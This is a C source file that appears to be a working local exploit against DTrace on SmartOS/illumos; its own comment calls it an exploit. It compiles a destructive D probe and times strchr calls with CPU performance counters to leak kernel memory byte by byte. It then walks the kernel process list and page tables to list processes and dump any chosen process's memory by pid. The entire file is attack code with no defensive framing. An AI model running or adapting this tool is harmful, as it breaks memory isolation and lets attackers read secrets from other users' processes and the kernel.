#define _KMEMUSER 1

#include <libcpc.h>
#include <sys/dtrace.h>
#include <dtrace.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>


#include <stddef.h>
#include <sys/proc.h>
#include <sys/user.h>
#include <sys/dtrace.h>
#include <vm/as.h>
#include <vm/seg.h>
#include <sys/avl.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sys/processor.h>
#include <sys/procset.h>

#include <errno.h>
#define        PT_PAGESIZE     (0x080)
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

#define  PT_PADDR        (0x000ffffffffff000ull)
#define  PT_PADDR_LGPG   (0x000fffffffffe000ull)
#define PTE_GET(p, f)   ((p) & (f))
#define PTE_IS_LGPG(p, l)       ((l) > 0 && PTE_GET((p), PT_PAGESIZE))
#define PTE2ADDR(p, l)   \
        (PTE_GET((p), PTE_IS_LGPG((p), (l)) ? PT_PADDR_LGPG : PT_PADDR))

#define TRACE(...) fprintf (stderr, __VA_ARGS__)

#define YOLO_OFFSET 1

typedef struct {
  int correct_value;
  int incorrect_value;
  uintptr_t proc_address;
  uintptr_t pid_address;
  int fd;
  dof_hdr_t *dof;
  dof_hdr_t *options_dof;
  dtrace_hdl_t *handle;
} dread_state;


typedef int8_t level_t;
typedef ulong_t         pfn_t;

void bail(char* error) {
  fprintf(stderr, error);
  exit(1);
}

uintptr_t resolve_symbol(dtrace_hdl_t* handle, char* name) {
    GElf_Sym symbol;

    int n = dtrace_lookup_by_name(handle,DTRACE_OBJ_KMODS, name, &symbol, NULL);
    if (n < 0) {
      bail("failed to lookup\n");
    }

    return symbol.st_value;
}

int open_dtrace() {
  int fd = open("/dev/dtrace/dtrace", O_RDWR);
  if (fd < 0) {
    bail("failed to open dtrace\n");
  }

  return fd;
}

void enable_dof(int fd, dof_hdr_t *dof) {
    int err = ioctl(fd, DTRACEIOC_ENABLE, dof);
    if (err < 0) {
      bail("failed to enable dof\n");
    }
}


void go_dof(int fd) {
  processorid_t cpu;
  int err = ioctl(fd, DTRACEIOC_GO, &cpu);
  if (err < 0) {
    perror("failed to go");
    exit(1);
  }
}

void enable_cpu_timing() {
  cpc_t * cpc;
  if ((cpc = cpc_open(CPC_VER_CURRENT)) == NULL)
          bail("perf counters unavailable");
  cpc_set_t * set;
  if ((set = cpc_set_create(cpc)) == NULL)
          bail("could not create set");

  int ind0;

  /* PAPI_br_ins , PAPI_tot_ins */
  if ((ind0 = cpc_set_add_request(cpc, set, "PAPI_br_ins", 0, CPC_COUNT_SYSTEM, 0,
          NULL)) == -1)
          bail("could not add first request");

  if (cpc_bind_curlwp(cpc, set, 0) == -1)
          bail("cannot bind lwp");

}


int probe(uintptr_t addr, char c) {
  asm("xor %ecx,%ecx");
  asm("RDPMC");
  uint32_t before;
  asm("mov %%eax, %0" : "=r" (before));

  ioctl(666, 0xDEADBEEF, addr, c);

  asm("xor %ecx,%ecx");
  asm("RDPMC");
  uint32_t after;
  asm("mov %%eax, %0" : "=r" (after));

  return after - before;
}

int intcompare(const void *p1, const void *p2)
{
    int i = *((int *)p1);
    int j = *((int *)p2);

    if (i > j)
        return (1);
    if (i < j)
        return (-1);
    return (0);
}

int most_common(uintptr_t addr, int byte) {

  int values[1000];

  for (int i = 0; i < sizeof(values) / sizeof(int); ++i) {
    values[i] = probe(addr, byte);
  }

  qsort(values, sizeof(values) / sizeof(int), sizeof(int), intcompare);

  int last_value = values[0];
  int most_common_value = values[0];
  int current_run = 1;
  int longest_run = 1;

  for (int i = 1; i < sizeof(values) / sizeof(int); ++i) {
    if (values[i] == last_value) {
      current_run += 1;
      if (current_run > longest_run) {
        most_common_value = last_value;
        longest_run = current_run;
      }
    } else {
      current_run = 1;
      last_value = values[i];
    }
  }

  for (int i = 0; i < sizeof(values)/sizeof(int); ++i) {
    //TRACE("%d\n", values[i]);
  }

  return most_common_value;
}

int probe_order[] = {255, 47, 115, 1, 116, 110, 105, 100, 32, 114, 109, 111, 101, 99, 108, 45, 98, 117, 97, 8, 112, 104, 118, 102, 103, 87, 48, 6, 121, 86, 78, 72, 74, 80, 11, 46, 73, 96, 180, 12, 40, 52, 122, 50, 192, 16, 120, 88, 228, 176, 125, 128, 14, 51, 7, 65, 240, 64, 49, 55, 24, 18, 200, 56, 79, 144, 9, 66, 152, 178, 188, 184, 53, 137, 136, 248, 44, 13, 95, 168, 224, 58, 232, 21, 183, 10, 204, 119, 38, 76, 251, 127, 164, 4, 247, 245, 244, 238, 139, 187, 27, 28, 31, 208, 106, 54, 216, 206, 198, 201, 62, 68, 189, 22, 227, 140, 69, 233, 236, 237, 158, 239, 70, 160, 175, 84, 159, 94, 207, 209, 57, 60, 214, 195, 132, 5, 63, 194, 215, 191, 252, 190, 113, 143, 71, 75, 30, 220, 107, 85, 92, 151, 15, 154, 25, 19, 148, 222, 163, 155, 26, 253, 93, 234, 91, 90, 89, 167, 221, 170, 149, 171, 83, 82, 161, 172, 29, 147, 77, 177, 146, 219, 181, 35, 241, 217, 186, 142, 67, 141, 246, 135, 134, 250, 123, 124, 213, 254, 3, 211, 2, 157, 205, 218, 202, 199, 210, 197, 196, 212, 59, 61, 43, 42, 41, 193, 39, 185, 37, 36, 182, 34, 33, 203, 179, 174, 173, 81, 169, 166, 165, 162, 23, 223, 225, 20, 156, 226, 17, 229, 153, 230, 231, 150, 235, 145, 242, 243, 138, 249, 133, 131, 130, 126, 129};


int read_byte_prime(uintptr_t addr, int correct, int incorrect) {
  int correct_count = 0;
  int incorrect_count = 0;
  int last_correct = 0;
  int errors = 0;
  for (int i = 0; i < 255; ++i) {
    int v = probe(addr, probe_order[i]);
    if (v == correct) {
      correct_count++;
      last_correct = probe_order[i];
      if (correct_count > 1 && incorrect_count == 0) {
        return 0;
      }
    } else if (v == incorrect) {
      incorrect_count++;
      if (correct_count == 1) {
        return last_correct;
      }
    } else {
      ++errors;
      --i;
      if (errors > 500) {
        return -1;
      }

    }
  }

  if (correct_count == 1) {
    return last_correct;
  }

  return -1;
}

int read_byte(dread_state* state, uintptr_t address, int correct, int incorrect) {
  int v = read_byte_prime(address, correct, incorrect);
  if (v == -1) {
    v = read_byte_prime(address, correct + YOLO_OFFSET, incorrect + YOLO_OFFSET);
  }
  if (v == -1) {
    close_state(state);
    reopen_state(state);
    v = read_byte_prime(address, correct, incorrect);
  }

  if (v == -1) {
    v = read_byte_prime(address, correct + YOLO_OFFSET, incorrect + YOLO_OFFSET);
  }
  if (v == -1) {

    TRACE("failed to read byte: %p\n", address);
    for (int i = 1; i < 256; ++i) {
      TRACE("most common return for reading byte: %d = %d\n", i, most_common(address, i));
    }
    exit(1);
  }

  return v;
}


int histo[256];

void dread_with_options(dread_state* state, uintptr_t addr, char* buf, int sz, int null_stop) {
  if (addr <= 0xfffffd7fffe00000) {
    fprintf(stderr, "attempted to read bad pointer %p\n", addr);
    exit(1);
  }

  if ((addr >= state->proc_address && addr + sz < state->proc_address + sizeof(proc_t)) ||
      (addr >= state->pid_address && addr + sz < state->pid_address + sizeof(struct pid))) {
    ioctl(666, 0xCAFEBABE, addr, buf, sz);
    return;
  }

  for (int i = 0; i < sz; ++i) {
    buf[i] = (char)read_byte(state, addr + i, state->correct_value, state->incorrect_value);
    histo[(unsigned char)buf[i]]++;
    if (buf[i] == 0 && null_stop) {
      break;
    }
  }
}


void dread_string(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 1);
}

void dread(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 0);
}


void dread_non_fatal(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 0);
}

int overlaps(uintptr_t l, size_t ls, uintptr_t r, size_t rs) {
  return l <= (r + rs) && r <= (l + ls);
}

void walknodes(dread_state* fd, uintptr_t p_brkbase, size_t p_brksize, size_t offset, uintptr_t node_ptr) {
  struct avl_node node;
  dread(fd, node_ptr, &node, sizeof(node));

  struct seg seg;
  dread(fd, node_ptr - offset, &seg, sizeof(seg));

  int is_heap = overlaps(p_brkbase, p_brksize, (uintptr_t)seg.s_base, seg.s_size);
  printf("SEGMENT: 0x%p %lu %s \n", seg.s_base, seg.s_size, is_heap ? "[heap]" : "");

  if (node.avl_child[0] != NULL) {
    walknodes(fd, p_brkbase, p_brksize, offset, (uintptr_t)node.avl_child[0]);
  }

  if (node.avl_child[1] != NULL) {
    walknodes(fd, p_brkbase, p_brksize, offset, (uintptr_t)node.avl_child[1]);
  }
}

void resolve_type(dtrace_hdl_t* handle, dtrace_typeinfo_t* type, char *name) {
    int n = dtrace_lookup_by_type(handle, DTRACE_OBJ_KMODS, name, type);
    if (n < 0) {
      fprintf(stderr, "failed to lookup type: %s\n", name);
      exit(1);
    }
}
/* smartos is so nice to write exploits on. all offsets and shit are in some DB where the function
 * calls start with ctf_*. capture-the-flag?. is this some kind of troll function naming */
ulong_t resolve_offset(dtrace_hdl_t* handle, char* name, char* member) {
    dtrace_typeinfo_t tip;

    resolve_type(handle, &tip, name);
    ctf_membinfo_t member_info;
    int n = ctf_member_info(tip.dtt_ctfp, tip.dtt_type, member, &member_info);
    if (n < 0) {
      fprintf(stderr, "failed to resolve member: %s\n", member);
      exit(1);
    }

    if (member_info.ctm_offset % 8 != 0) {
      bail("offset not byte aligned\n");
    }
    return member_info.ctm_offset / 8;
}

ssize_t type_size(dtrace_hdl_t* handle, char* name) {
  dtrace_typeinfo_t tip;
  resolve_type(handle, &tip, name);
  return ctf_type_size(tip.dtt_ctfp, tip.dtt_type);
}



#define HTABLE_HASH(hat, va, lvl,hat_num_hash, level_shift1)                                       \
        ((((va) >> level_shift1) + ((va) >> 28) + (lvl) +             \
        ((uintptr_t)(hat) >> 4)) & (hat_num_hash - 1))

/* define HTABLE_NUM_PTES(ht)     (((ht)->ht_flags & HTABLE_VLP) ? 4 : 512) */
#define HTABLE_NUM_PTES (512)

struct memory_info {

  uint_t max_level;
  uint_t mmu_pte_size_shift;
  uint_t num_hash;
  uint_t _mmu_pageshift;
  caddr_t kpm_base;
  size_t level_mask_offset;
  size_t level_shift_offset;
  uint_t level_shift1;
  uintptr_t hat_ht_hash;

  size_t ht_hat_offset;
  size_t ht_vaddr_offset;
  size_t ht_level_offset;
  size_t ht_next_offset;
  size_t ht_pfn_offset;

  ssize_t htable_t_size;

  uintptr_t mmu;
  uint_t max_page_level;
  ulong_t page_mask;

  uintptr_t kpm_vbase;
};

void load_memory_info(dtrace_hdl_t* handle, dread_state* fd, uintptr_t hat, struct memory_info* info) {

    info->mmu = resolve_symbol(handle, "mmu");
    uintptr_t mmu = info->mmu;

    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "max_page_level"), &info->max_page_level, sizeof(info->max_page_level));

    dread(fd, resolve_symbol(handle, "_mmu_pagemask"), &info->page_mask, sizeof(info->page_mask));

    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "max_level"), &info->max_level, sizeof(info->max_level));
    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "pte_size_shift"), &info->mmu_pte_size_shift, sizeof(info->mmu_pte_size_shift));
    dread(fd, hat + resolve_offset(handle, "struct hat", "hat_num_hash"), &info->num_hash, sizeof(info->num_hash));
    dread(fd, resolve_symbol(handle, "_mmu_pageshift"), &info->_mmu_pageshift, sizeof(info->_mmu_pageshift));
    dread(fd, resolve_symbol(handle, "kpm_vbase"), &info->kpm_vbase, sizeof(info->kpm_vbase));


    info->level_mask_offset = resolve_offset(handle, "struct hat_mmu_info", "level_mask");
    info->level_shift_offset = resolve_offset(handle, "struct hat_mmu_info", "level_shift");

    dread(fd, mmu + info->level_shift_offset + sizeof(info->level_shift1) * 1, &info->level_shift1, sizeof(info->level_shift1));
    dread(fd, hat + resolve_offset(handle, "struct hat", "hat_ht_hash"), &info->hat_ht_hash, sizeof(info->hat_ht_hash));

    info->htable_t_size = type_size(handle, "struct htable");

    info->ht_hat_offset = resolve_offset(handle, "struct htable", "ht_hat");
    info->ht_vaddr_offset = resolve_offset(handle, "struct htable", "ht_vaddr");
    info->ht_level_offset = resolve_offset(handle, "struct htable", "ht_level");
    info->ht_next_offset = resolve_offset(handle, "struct htable", "ht_next");
    info->ht_pfn_offset = resolve_offset(handle, "struct htable", "ht_pfn");


}


uintptr_t htable_lookup(dtrace_hdl_t* handle, dread_state* fd, uintptr_t hat, uintptr_t vaddr, level_t level, struct memory_info* info) {
    TRACE("hat: %p\n", hat);
    uintptr_t base;
    if (level == info->max_level) {
      base = 0;
    } else {
      uintptr_t level_mask;
      dread(fd, info->mmu + info->level_mask_offset + sizeof(uintptr_t) * (level + 1), &level_mask, sizeof(level_mask));

      TRACE("using level mask: %p old base: %p\n", level_mask, base);
      base = vaddr & level_mask;
      TRACE("new base: %p\n", base);

    }


    uint_t hash_val = HTABLE_HASH(hat, base, level, info->num_hash, info->level_shift1);


    TRACE("hashval %p\n", hash_val);
    TRACE("reading address: %p hat_ht_hash: %p\n", info->hat_ht_hash + sizeof(uintptr_t) * hash_val, info->hat_ht_hash);

    uintptr_t ht;
    dread(fd, info->hat_ht_hash + sizeof(uintptr_t) * hash_val, &ht, sizeof(ht));

    uintptr_t pa = 0;
    while (ht != 0) {
      char htable_t[info->htable_t_size];
      dread(fd, ht, &htable_t, info->htable_t_size);

      uintptr_t ht_hat = *(uintptr_t*)&htable_t[info->ht_hat_offset];
      uintptr_t ht_vaddr = *(uintptr_t*)&htable_t[info->ht_vaddr_offset];
      uint8_t ht_level = *(uint8_t*)&htable_t[info->ht_level_offset];
      uintptr_t ht_next = *(uintptr_t*)&htable_t[info->ht_next_offset];

      TRACE("vaddr: %p ht_hat: %p ht_vaddr: %p ht_level: %d ht_next: %p\n", base, ht_hat, ht_vaddr, ht_level, ht_next);
      if (ht_hat == hat && ht_vaddr == base && ht_level == level) {
        pfn_t pfn = *(pfn_t*)&htable_t[info->ht_pfn_offset];
        TRACE("found pfn: %d\n", pfn);

        uint_t level_shift;
        dread(fd, info->mmu + info->level_shift_offset + sizeof(level_shift) * ht_level, &level_shift, sizeof(level_shift));
        uint_t entry = (vaddr >> level_shift) &  (HTABLE_NUM_PTES -1);
        TRACE("found entry: %d level_shift: %d\n", entry, level_shift);
        TRACE("kpm_vbase: %p _mmu_pageshift: %d mmu_pte_size_shift: %d vaddr: %p\n", info->kpm_vbase,  info->_mmu_pageshift, info->mmu_pte_size_shift, vaddr);
        uintptr_t pte;
        dread(fd, info->kpm_vbase + (pfn << info->_mmu_pageshift) + (entry << info->mmu_pte_size_shift), &pte, sizeof(pte));

        TRACE("pte is %p \n", pte);
        pa = PTE2ADDR(pte, ht_level);
        TRACE("pa is %p\n", pa);
        break;
      }
      ht = ht_next;
    }

    return pa;

}

uintptr_t lookup_each_level(dtrace_hdl_t *handle, dread_state* fd, uintptr_t hat, uintptr_t vaddr, struct memory_info* memory_info) {
    vaddr = vaddr & memory_info->page_mask;

    for (int l = 0; l <= memory_info->max_page_level; ++l) {
      uintptr_t pa = htable_lookup(handle, fd, hat, vaddr, l, memory_info);
      if (pa != NULL) {
        return pa;
      }
    }

    return NULL;

}


void dump_memory(dtrace_hdl_t *handle, dread_state* fd, uintptr_t process, uintptr_t vaddr, size_t size) {

  uintptr_t p_as;
  dread(fd, process + offsetof(proc_t, p_as), &p_as, sizeof(p_as));

  struct  as as;

  dread(fd, p_as, &as, sizeof(as));

  TRACE("using as: %p\n", p_as);

  struct memory_info memory_info;
  load_memory_info(handle, fd, as.a_hat, &memory_info);

  size_t pagesize = getpagesize();
  size_t amount_read = 0;
  int reads = (size  + pagesize - 1) / pagesize;
  char buffer[pagesize];

  for (int i = 0; i < reads; ++i) {
    size_t offset = (vaddr & (pagesize - 1));
    size_t amount_to_read = MIN(pagesize - offset, size - amount_read);

    uintptr_t pa = lookup_each_level(handle, fd, as.a_hat, vaddr, &memory_info);
    if (pa == 0) {
      fprintf(stderr, "failed to find mapping for vaddr: %p\n", vaddr);
    } else {
      uintptr_t real_addr = pa + offset;
      uintptr_t virtual_addr = memory_info.kpm_vbase + real_addr;


      TRACE("reading %d from %p (%p)\n", amount_to_read, real_addr, virtual_addr);

      dread(fd, virtual_addr, &buffer, amount_to_read);
      if (amount_to_read != write(1, buffer, amount_to_read)) {
        bail("failed to write to stdout\n");
      }
    }

    vaddr += amount_to_read;
    amount_read += amount_to_read;
  }



}

void walk_procs(dtrace_hdl_t *handle, dread_state* fd, void (*callback)(dtrace_hdl_t*, dread_state*, uintptr_t process_ptr, pid_t, void*), void* data) {

    uintptr_t practive = resolve_symbol(handle, "practive");
    uintptr_t process_ptr;
    dread(fd, (void*)practive, &process_ptr, sizeof(process_ptr));

    while (process_ptr != 0) {


      uintptr_t ppid_ptr;
      dread(fd, process_ptr + offsetof(proc_t, p_pidp), &ppid_ptr, sizeof(ppid_ptr));

      pid_t pid;
      dread(fd, ppid_ptr + offsetof(struct pid, pid_id), &pid, sizeof(pid));
      callback(handle, fd, process_ptr, pid, data);
      uintptr_t p_next;
      dread(fd, process_ptr + offsetof(proc_t, p_next), &p_next, sizeof(void*));
      process_ptr = p_next;
    }
}

struct find_proc {
  pid_t pid;
  int found;
  uintptr_t process;
};

void find_proc(dtrace_hdl_t * handle, dread_state* fd, uintptr_t process, pid_t pid, void* data) {
  struct find_proc* find = data;
  if (pid == find->pid) {
    find->found = 1;
    find->process = process;
  }
}

void dump_process(dtrace_hdl_t * handle, dread_state* fd, uintptr_t process, pid_t pid, void* data) {

  uintptr_t brkbase;
  dread(fd, process + offsetof(proc_t, p_brkbase), &brkbase, sizeof(void*));

  char    u_comm[MAXCOMLEN + 1];
  dread_string(fd, process + offsetof(proc_t, p_user) + offsetof(user_t, u_comm), &u_comm, sizeof(u_comm));
  char    u_psargs[PSARGSZ];
  dread_string(fd, process + offsetof(proc_t, p_user) + offsetof(user_t, u_psargs), &u_psargs, sizeof(u_psargs));

  printf("%d %s %s %p\n", pid, u_comm, u_psargs, brkbase);

}

void dump_segments(dtrace_hdl_t * handle, dread_state* fd, uintptr_t process) {

      uintptr_t p_as;
      dread(fd, process + offsetof(proc_t, p_as), &p_as, sizeof(p_as));


      avl_tree_t a_segtree;
      dread(fd, p_as + offsetof(struct as, a_segtree), &a_segtree, sizeof(a_segtree));

      uintptr_t p_brkbase;
      dread(fd, process + offsetof(proc_t, p_brkbase), &p_brkbase, sizeof(p_brkbase));

      size_t p_brksize;
      dread(fd, process + offsetof(proc_t, p_brksize), &p_brksize, sizeof(p_brksize));

      walknodes(fd, p_brkbase, p_brksize, a_segtree.avl_offset, a_segtree.avl_root);
}

void print_usage(char** argv) {
  fprintf(stderr, "Usage: %s [ps|segment|dump] -p pid -a addr (hex) -s size (decimal)\n", argv[0]);
}

#define PS 1
#define SEGMENT 2
#define DUMP 3

void reopen_state(dread_state* state) {
  state->fd = open_dtrace();

  enable_dof(state->fd, state->options_dof);
  enable_dof(state->fd, state->dof);
  go_dof(state->fd);

  ioctl(666, 0xCAFEBABE, state->proc_address + offsetof(proc_t, p_pidp), &state->pid_address, 8);

  uintptr_t load_message_address = resolve_symbol(state->handle, "load_msg");

  state->correct_value = most_common(load_message_address, 'l');
  state->incorrect_value = most_common(load_message_address, 'm');

  TRACE("correct_value: %d incorrect_value: %d proc_address: %p pid_address: %p limit: %p\n", state->correct_value, state->incorrect_value, state->proc_address, state->pid_address, state->pid_address + sizeof(struct pid));

}
void open_state(dread_state* state, dtrace_hdl_t *handle) {


  (void) dtrace_setopt(handle, "bufsize", "32");
  (void) dtrace_setopt(handle, "aggsize", "0");
  (void) dtrace_setopt(handle, "temporal", "yes");
  (void) dtrace_setopt(handle, "dynvarsize", "0");
  (void) dtrace_setopt(handle, "destructive", "yes");
  (void) dtrace_setopt(handle, "strsize", "1");

  char* template = "syscall::ioctl:entry / arg1 == 0xDEADBEEF  / { strchr((char*)arg2, (int)arg3);  } BEGIN { this->x = (void**)alloca(sizeof(void*)); this->x[0] = curthread->t_procp; copyout(this->x, 0x%p, sizeof(void*));} syscall::ioctl:entry / arg1 == 0xCAFEBABE/ {copyout((void*)arg2, arg3, arg4);}";

  char buf[strlen(template) + 16];
  sprintf(buf, template, &state->proc_address);

  dtrace_prog_t *prog = dtrace_program_strcompile(handle, buf,
        DTRACE_PROBESPEC_NAME, 0, 0, NULL);



 if (prog == NULL) {
    bail("failed to compile prog\n");
  }

  state->dof = dtrace_dof_create(handle, prog, DTRACE_D_STRIP);

  if (state->dof == NULL) {
    bail("failed to create dof\n");
  }


  state->options_dof = dtrace_getopt_dof(handle);
  state->handle = handle;

  reopen_state(state);

}

void close_state(dread_state* state) {
  close(state->fd);
}



int main(int argc, char** argv) {

    char** orig_argv = argv;

    int mode = PS;
    int has_command = 0;

    if (argc >= 2) {
      char* command = argv[1];
      if (!strcmp(command, "ps")) {
        mode = PS;
        has_command = 1;
      } else if (!strcmp(command, "segment")) {
        mode = SEGMENT;
        has_command = 1;
      } else if (!strcmp(command, "dump")) {
        mode = DUMP;
        has_command = 1;
      }
    }

    if (has_command) {
      argc--;
      argv++;
    }


    int option;
    pid_t pid = -1;
    uintptr_t addr;
    size_t size;
    int has_size = 0;
    int has_addr = 0;
    char* invalid = NULL;

    if (mode == DUMP) {
      while ((option = getopt(argc, argv,"p:a:s:")) != -1) {
        switch (option) {
          case 'p':
            pid = atoi(optarg);
            break;
          case 'a':
            errno = 0;
            addr = strtoul(optarg, &invalid, 16);
            if (errno != 0 || *invalid != '\0') {
              print_usage(orig_argv);
              exit(1);
            }
            has_addr = 1;
            break;
          case 's':
            size = atol(optarg);
            has_size = 1;
            break;
          default:
            break;
         }
       }
       if (!has_addr || !has_size || pid == -1) {
         print_usage(orig_argv);
         exit(1);
       }
    }

    if (mode == SEGMENT) {
      while ((option = getopt(argc, argv,"p:")) != -1) {
        switch (option) {
          case 'p':
            pid = atoi(optarg);
            break;
        }
      }

      if (pid == -1) {
        print_usage(orig_argv);
        exit(1);
      }
    }

    int err;
    dtrace_hdl_t *handle = dtrace_open(DTRACE_VERSION, 0, &err);
    if (!handle) {
      fprintf(stderr, "err opening dtrace: %d\n", err);
      exit(1);
    }

    enable_cpu_timing();

    dread_state state;
    open_state(&state, handle);

    /*char buf[8];
    dread_with_options(&state, 0xfffffe000b599ca8, buf, 8, 0);
    exit(1);*/

    if (mode == SEGMENT || mode == DUMP) {
      struct find_proc find;
      find.found = 0;
      find.pid = pid;
      find.process = 0;
      walk_procs(handle, &state, find_proc, &find);
      if (find.found) {
        if (mode == SEGMENT) {
          dump_segments(handle, &state, find.process);
        } else {
          dump_memory(handle, &state, find.process, addr, size);
        }
      } else {
        fprintf(stderr, "Failed to find pid: %d\n", pid);
        exit(1);
      }
    } else {
      printf("PID COMMAND PSARGS BRKBASE\n");
      walk_procs(handle, &state, &dump_process, NULL);
    }

  /*for (int i = 0; i < 256; ++i) {
    printf("%d: %d\n", i, histo[i]);
  }*/
}
